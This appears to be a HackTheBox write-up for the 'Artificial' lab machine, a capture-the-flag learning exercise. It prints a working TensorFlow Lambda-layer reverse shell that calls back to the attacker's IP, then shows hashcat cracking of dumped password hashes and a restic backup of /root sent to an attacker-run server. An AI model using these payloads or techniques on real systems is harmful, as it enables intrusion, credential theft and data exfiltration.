---
title: Artificial - HackTheBox
date: 2025-07-07
categories: [Writeups, HTB]
tags: [Linux, HTB, TensorFlow, SQLite, Backrest, Restic]
image: /assets/img/commons/artificial/artificial.png
---

In this write-up, I detail the complete process to solve this machine, including the phases of reconnaissance, enumeration, exploitation, and post-exploitation.

- **Machine:** [Artificial](https://app.hackthebox.com/machines/Artificial)
- **System:** Linux
- **Difficulty:** <span style="color: green; font-weight: bold;">Easy</span>

## Reconnaissance

First, I check connectivity using `ping` with the target machine to ensure it is accessible on the network:

```bash
ping -c 1 10.10.11.74
PING 10.10.11.74 (10.10.11.74) 56(84) bytes of data.
64 bytes from 10.10.11.74: icmp_seq=1 ttl=63 time=50.2 ms

--- 10.10.11.74 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 50.199/50.199/50.199/0.000 ms
```

## Enumeration

Now, I perform a scan with `nmap` to identify open ports on the target:

```bash
nmap -p- --open 10.10.11.74 --min-rate 5000 -oN ports.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 03:47 CEST
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds
```

After discovering open ports 22 (SSH) and 80 (HTTP), I enumerate service versions and run default scripts to gather more detailed information:

```bash
nmap -p22,80 -sV -sC 10.10.11.74 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 03:50 CEST
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
```

## Exploitation

First, I use `searchsploit` to check for any public exploits associated with the detected service versions, but no relevant exploits are found in Exploit-DB:

```bash
searchsploit OpenSSH 8.2  
Exploits: No Results
Shellcodes: No Results

searchsploit nginx 1.18.0
Exploits: No Results
Shellcodes: No Results
```

Since no public exploits are available, I move to manual testing by interacting with the web application, now I proceed to access the website to manually exploit vulnerabilities:

![web](/assets/img/commons/artificial/home.png){: .center-image }

I find a registration option on the website, so I create an account and log in. After logging in, there is a page where you can upload a TensorFlow .h5 model to make a prediction.

![web](/assets/img/commons/artificial/model_upload.png){: .center-image }

On this page, the following requirements.txt is provided to correctly generate the model:

```py
tensorflow-cpu==2.13.1
```

There is also an option to set up a container with the following Dockerfile:

```docker
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

A vulnerability when uploading .h5 files is the ability to inject a Lambda layer with malicious Python code. In this case, I want to obtain a reverse shell, so the generation of the .h5 with Python could look like this:

```py
import tensorflow as tf

def exploit(x):
    import socket, subprocess, os
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.16.33", 443))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.Popen(["/bin/sh", "-i"])
    except Exception as e:
        pass
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

In this script, I create a basic TensorFlow model saved as "exploit.h5". The key point is that I add a Lambda layer with a custom Python function in the following line:

```py
model.add(tf.keras.layers.Lambda(exploit))
```

The Lambda layer of the model is assigned the exploit function, which establishes a connection to my machine and, using redirectors, launches an interactive reverse shell on port 443:

```py
def exploit(x):
    import socket, subprocess, os
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.16.33", 443))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.Popen(["/bin/sh", "-i"])
    except Exception as e:
        pass
    return x
```

I proceed to upload the .h5 file to the website:

![web](/assets/img/commons/artificial/exploit_upload.png){: .center-image }

Now there is an option to make predictions on the model. This is where the Lambda function will be called, launching the reverse shell. So first, I listen with `netcat` on port 443:

```bash
nc -nlvp 443
```

I click to make predictions on the website, the Lambda is executed on the server, and I get a reverse shell:

```bash
$ whoami
app
```

## Post-Exploitation

I proceed to perform a basic tty treatment:

```
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
export TERM=xterm
```

### User gael

I find another user on the system with their own home directory:

```bash
app@artificial:/home$ ls
app  gael
```

Listing the main directory of app, I find the following:

```bash
app@artificial:~/app$ ls
app.py  instance  models  __pycache__  static  templates
```

After reviewing the directories, the most interesting is instance since it contains a users.db:

```bash
app@artificial:~/app/instance$ ls
users.db
```

I analyze it with `file` to see which engine it uses:

```bash
app@artificial:~/app/instance$ file users.db
users.db: SQLite 3.x database, last written using SQLite version 3031001
```

I open the database file with `sqlite3`:

```bash
app@artificial:~/app/instance$ sqlite3 users.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
```

I list the tables with `.tables`, where I find the tables model and user:

```sql
sqlite> .tables
model  user
```

I analyze the schema of the user table with `.schema`, where I find that the last field is password:

```sql
sqlite> .schema user
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(100) NOT NULL, 
        email VARCHAR(120) NOT NULL, 
        password VARCHAR(200) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
);
```

I select all tuples from the user table, where I find the user gael, who had their home on the server, and a hashed password:

```sql
sqlite> select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|a|a@a.com|0cc175b9c0f1b6a831c399e269772661
7|h|h@gmx.com|2510c39011c5be704182423e3a695e91
```

I use `hashid` to try to identify what type of hash was used:

```bash
hashid c99175974b6e192936d97224638a34f8                  
Analyzing 'c99175974b6e192936d97224638a34f8'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x
```

In app.py there is a hash function that uses MD5, so now we know the hash:

```py
def hash(password):
 password = password.encode()
 hash = hashlib.md5(password).hexdigest()
 return hash
```

Now I try to crack the password with `hashcat` using the rockyou.txt wordlist, where I find the clear password mattp005numbertwo:

```bash
hashcat -m 0 c99175974b6e192936d97224638a34f8 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1053 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c99175974b6e192936d97224638a34f8:mattp005numbertwo        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: c99175974b6e192936d97224638a34f8
Time.Started.....: Mon Jul  7 14:26:18 2025 (0 secs)
Time.Estimated...: Mon Jul  7 14:26:18 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 45344.9 kH/s (2.30ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7864320/14344385 (54.83%)
Rejected.........: 0/7864320 (0.00%)
Restore.Point....: 3932160/14344385 (27.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: seaford123 -> giuli94
Hardware.Mon.#1..: Temp: 46c Fan:  0% Util: 20% Core:2640MHz Mem:10251MHz Bus:16

Started: Mon Jul  7 14:26:17 2025
Stopped: Mon Jul  7 14:26:19 2025
```

I connect via ssh to the server with credentials:
- user: gael
- password: mattp005numbertwo

```bash
ssh gael@artificial.htb
gael@artificial.htb's password: 
gael@artificial:~$ whoami
gael
```

### User root

I check if the user gael has permissions to run commands as root with `sudo -l`, but the system indicates that no sudo privileges are assigned.

```bash
gael@artificial:~$ sudo -l
[sudo] password for gael: 
Sorry, user gael may not run sudo on artificial.
```

I run the `id` command to see which groups gael belongs to and find that he belongs to a sysadm group:

```bash
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

Now I search for system files with group permissions for sysadm:

```bash
gael@artificial:~$ find / -group sysadm -ls 2>/dev/null
293066  51132 -rw-r-----   1 root     sysadm   52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz
```

I transfer the backrest_backup.tar.gz file to my machine, extract it, and find a .config directory with a config.json:

```bash
cat config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

There is a password encrypted with Bcrypt but it is in base64, so I first decode it:

```bash
echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

Now I try to crack the password with `hashcat` using the rockyou.txt wordlist, where I find the clear password !@#$%^:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 395 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO
Time.Started.....: Mon Jul  7 15:42:42 2025 (2 secs)
Time.Estimated...: Mon Jul  7 15:42:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3485 H/s (6.10ms) @ Accel:1 Loops:16 Thr:24 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5760/14344385 (0.04%)
Rejected.........: 0/5760 (0.00%)
Restore.Point....: 4320/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: delgado -> palacios
Hardware.Mon.#1..: Temp: 46c Fan:  0% Util: 97% Core:2820MHz Mem:10251MHz Bus:16

Started: Mon Jul  7 15:42:38 2025
Stopped: Mon Jul  7 15:42:45 2025
```

On the server, running `ss -tuln` shows that there are different services:

```bash
ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        2048                                           127.0.0.1:5000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:9898                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        5                                                0.0.0.0:8080                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                                [::1]:5000                                               [::]:*                                                
tcp                     LISTEN                   0                        128                                                [::1]:9898                                               [::]:*                                                
tcp                     LISTEN                   0                        511                                                 [::]:80                                                 [::]:*                                                
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                                         
```

From my machine, I can do local port forwarding to view those pages:

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

Now I can access 127.0.0.1:9898 in my browser and see that web page, where I log in with the credentials from config.json:
- user: backrest_root
- password: !@#$%^

From this web panel, we can create a backrest repository, which is a backup and restore tool often used to manage data backups. On the victim machine, Backrest is installed or accessible as a binary (/opt/backrest/restic). To exploit or interact with this functionality, you often need to run a compatible server (such as rest-server):

```bash
rest-server --listen :555 --no-auth
Data directory: /tmp/restic
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:555
```

And from the backrest panel, we create a repository and execute the following command:

```bash
/opt/backrest/restic -r rest:http://10.10.16.33:555/repo init
```

Next, we send a backup of /root:

```bash
/opt/backrest/restic -r rest:http://10.10.16.33:555/repo backup /root
```

From our machine, we list snapshots:

```bash
restic -r /tmp/restic/repo snapshots
enter password for repository: 
repository b473ab6a opened (version 2, compression level auto)
created new cache in /home/kali/.cache/restic
ID        Time                 Host        Tags        Paths  Size
-----------------------------------------------------------------------
51c80d3a  2025-07-07 16:22:54  artificial              /root  4.299 MiB
-----------------------------------------------------------------------
```

Now we restore the snapshot of the /root backup:

```bash
restic -r /tmp/restic/repo restore 51c80d3a --target ./restored
enter password for repository: 
repository b473ab6a opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
restoring snapshot 51c80d3a of [/root] at 2025-07-07 14:22:54.99961818 +0000 UTC by root@artificial to ./restored
Summary: Restored 80 files/dirs (4.299 MiB) in 0:00
```

Now we have access to the /root directory where there is an rsa key:

```bash
ls -la                                    
total 12
drwx------ 6 kali kali  220 Jul  7 13:46 .
drwx------ 3 kali kali   60 Jul  7 16:26 ..
lrwxrwxrwx 1 kali kali    9 Jun  9 11:37 .bash_history -> /dev/null
-rw-r--r-- 1 kali kali 3106 Dec  5  2019 .bashrc
drwxr-xr-x 3 kali kali   80 Mar  3 22:52 .cache
drwxr-xr-x 3 kali kali   60 Oct 19  2024 .local
-rw-r--r-- 1 kali kali  161 Dec  5  2019 .profile
lrwxrwxrwx 1 kali kali    9 Oct 19  2024 .python_history -> /dev/null
-rw-r----- 1 kali kali   33 Jul  7 13:46 root.txt
drwxr-xr-x 2 kali kali   80 Jun  9 15:57 scripts
drwx------ 2 kali kali   80 Mar  4 23:40 .ssh
```

So we can connect to the machine as root:

```bash
ssh root@10.10.11.74 -i id_rsa
root@artificial:~# whoami
root
```